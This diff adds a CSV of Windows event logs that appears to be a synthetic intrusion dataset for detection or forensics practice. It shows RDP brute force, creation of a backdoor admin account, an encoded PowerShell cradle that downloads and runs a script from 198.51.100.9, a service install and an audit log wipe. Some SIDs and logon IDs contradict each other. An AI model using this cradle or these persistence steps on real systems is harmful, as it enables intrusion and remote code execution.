@@ -1,0 +1,374 @@
+Keywords,Date and Time,Source,Event ID,Task Category,Level,Opcode,User,Computer,Message
+Audit Success,9/14/2026 1:58:00 AM,Microsoft-Windows-Security-Auditing,4624,Logon,Information,Info,CORP\jsmith,WS-JSMITH,"An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		WS-JSMITH$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		2
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		No
+
+New Logon:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1001
+	Account Name:		jsmith
+	Account Domain:		CORP
+	Logon ID:		0x8DCDC
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x44c
+	Process Name:		C:\Windows\System32\svchost.exe
+
+Network Information:
+	Workstation Name:	WS-JSMITH
+	Source Network Address:	10.20.30.21
+	Source Port:		51544
+
+This event is generated when a logon session is created."
+Audit Failure,9/14/2026 2:06:05 AM,Microsoft-Windows-Security-Auditing,4625,Logon,Information,Info,-,WS-LAB03,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			10
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		jsmith
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	WS-LAB03
+	Source Network Address:	203.0.113.77
+	Source Port:		51544"
+Audit Failure,9/14/2026 2:06:23 AM,Microsoft-Windows-Security-Auditing,4625,Logon,Information,Info,-,WS-LAB03,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			10
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		jsmith
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	WS-LAB03
+	Source Network Address:	203.0.113.77
+	Source Port:		51544"
+Audit Failure,9/14/2026 2:06:41 AM,Microsoft-Windows-Security-Auditing,4625,Logon,Information,Info,-,WS-LAB03,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			10
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		jsmith
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	WS-LAB03
+	Source Network Address:	203.0.113.77
+	Source Port:		51544"
+Audit Failure,9/14/2026 2:07:02 AM,Microsoft-Windows-Security-Auditing,4625,Logon,Information,Info,-,WS-LAB03,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			10
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		jsmith
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	WS-LAB03
+	Source Network Address:	203.0.113.77
+	Source Port:		51544"
+Audit Failure,9/14/2026 2:07:29 AM,Microsoft-Windows-Security-Auditing,4625,Logon,Information,Info,-,WS-LAB03,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			10
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		jsmith
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	WS-LAB03
+	Source Network Address:	203.0.113.77
+	Source Port:		51544"
+Audit Failure,9/14/2026 2:07:55 AM,Microsoft-Windows-Security-Auditing,4625,Logon,Information,Info,-,WS-LAB03,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			10
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		jsmith
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	WS-LAB03
+	Source Network Address:	203.0.113.77
+	Source Port:		51544"
+Audit Success,9/14/2026 2:08:31 AM,Microsoft-Windows-Security-Auditing,4624,Logon,Information,Info,CORP\jsmith,WS-LAB03,"An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		WS-LAB03$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		10
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		No
+
+New Logon:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1001
+	Account Name:		jsmith
+	Account Domain:		CORP
+	Logon ID:		0x8DCDC
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x44c
+	Process Name:		C:\Windows\System32\svchost.exe
+
+Network Information:
+	Workstation Name:	WS-LAB03
+	Source Network Address:	203.0.113.77
+	Source Port:		51544
+
+This event is generated when a logon session is created."
+Audit Success,9/14/2026 2:09:12 AM,Microsoft-Windows-Security-Auditing,4688,Process Creation,Information,Info,CORP\jsmith,WS-LAB03,"A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1001
+	Account Name:		jsmith
+	Account Domain:		CORP
+	Logon ID:		0x8DCDC
+
+Process Information:
+	New Process ID:		0x1a2b
+	New Process Name:	C:\Windows\System32\net.exe
+	Creator Process ID:	0x9c4
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	net user svc-backup2 /add"
+Audit Success,9/14/2026 2:11:40 AM,Microsoft-Windows-Security-Auditing,4720,User Account Management,Information,Info,CORP\jsmith,WS-LAB03,"A user account was created.
+
+Subject:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-500
+	Account Name:		jsmith
+	Account Domain:		CORP
+	Logon ID:		0x2F1A4
+
+New Account:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1105
+	Account Name:		svc-backup2
+	Account Domain:		CORP
+
+Attributes:
+	SAM Account Name:	svc-backup2
+	Display Name:		svc-backup2
+	User Principal Name:	svc-backup2@example.invalid
+	Password Last Set:	14/09/2026 09:41:02
+	Account Expires:		Never"
+Audit Success,9/14/2026 2:12:30 AM,Microsoft-Windows-Security-Auditing,4732,Security Group Management,Information,Info,CORP\jsmith,WS-LAB03,"A member was added to a security-enabled security group.
+
+Subject:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-500
+	Account Name:		jsmith
+	Account Domain:		CORP
+	Logon ID:		0x2F1A4
+
+Member:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1105
+	Account Name:		svc-backup2
+	Account Domain:		CORP
+
+Group:
+	Security ID:		S-1-5-32-544
+	Group Name:		Administrators
+	Group Domain:		BUILTIN"
+Audit Success,9/14/2026 2:14:02 AM,Microsoft-Windows-Security-Auditing,4732,Security Group Management,Information,Info,CORP\jsmith,WS-LAB03,"A member was added to a security-enabled security group.
+
+Subject:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-500
+	Account Name:		jsmith
+	Account Domain:		CORP
+	Logon ID:		0x2F1A4
+
+Member:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1105
+	Account Name:		svc-backup2
+	Account Domain:		CORP
+
+Group:
+	Security ID:		S-1-5-32-544
+	Group Name:		Remote Desktop Users
+	Group Domain:		BUILTIN"
+Audit Success,9/14/2026 2:15:20 AM,Microsoft-Windows-Security-Auditing,4688,Process Creation,Information,Info,CORP\svc-backup2,WS-LAB03,"A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1001
+	Account Name:		svc-backup2
+	Account Domain:		CORP
+	Logon ID:		0x8DCDC
+
+Process Information:
+	New Process ID:		0x1a2b
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Creator Process ID:	0x9c4
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBwAC4AcABzADEAJwApAA=="
+,9/14/2026 2:15:26 AM,Microsoft-Windows-PowerShell,4104,ExecuteCommand,Information,Info,CORP\svc-backup2,WS-LAB03,"Creating Scriptblock text (1 of 1):
+$c = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBwAC4AcABzADEAJwApAA==')); Invoke-Expression $c
+
+ScriptBlock ID: 8f2c1a44-3b7e-4c1d-9a55-1f4d2e6b7c88
+Path: "
+,9/14/2026 2:18:47 AM,Service Control Manager,7045,General,Information,Info,SYSTEM,SRV-FILES01,"A service was installed in the system.
+
+Service Name:  DemoUpdater
+Service File Name:  C:\ProgramData\DemoUpdater\updater.exe
+Service Type:  user mode service
+Service Start Type:  auto start
+Service Account:  LocalSystem"
+Audit Success,9/14/2026 2:31:05 AM,Microsoft-Windows-Security-Auditing,1102,Audit Log Cleared,Information,Info,CORP\jsmith,WS-LAB03,"The audit log was cleared.
+
+Subject:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-500
+	Account Name:		jsmith
+	Domain Name:		CORP
+	Logon ID:		0x2F1A4"
+Audit Success,9/14/2026 3:02:00 AM,Microsoft-Windows-Security-Auditing,4726,User Account Management,Information,Info,CORP\Administrator,WS-ADMIN01,"A user account was deleted.
+
+Subject:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-500
+	Account Name:		Administrator
+	Account Domain:		CORP
+	Logon ID:		0x2F1A4
+
+Target Account:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1105
+	Account Name:		temp-admin
+	Account Domain:		CORP"
+Audit Success,9/14/2026 3:20:00 AM,Microsoft-Windows-Security-Auditing,4624,Logon,Information,Info,CORP\Administrator,WS-ADMIN01,"An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		WS-ADMIN01$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		2
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+New Logon:
+	Security ID:		S-1-5-21-1000000000-2000000000-3000000000-1001
+	Account Name:		Administrator
+	Account Domain:		CORP
+	Logon ID:		0x8DCDC
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x44c
+	Process Name:		C:\Windows\System32\svchost.exe
+
+Network Information:
+	Workstation Name:	WS-ADMIN01
+	Source Network Address:	10.20.30.10
+	Source Port:		51544
+
+This event is generated when a logon session is created."
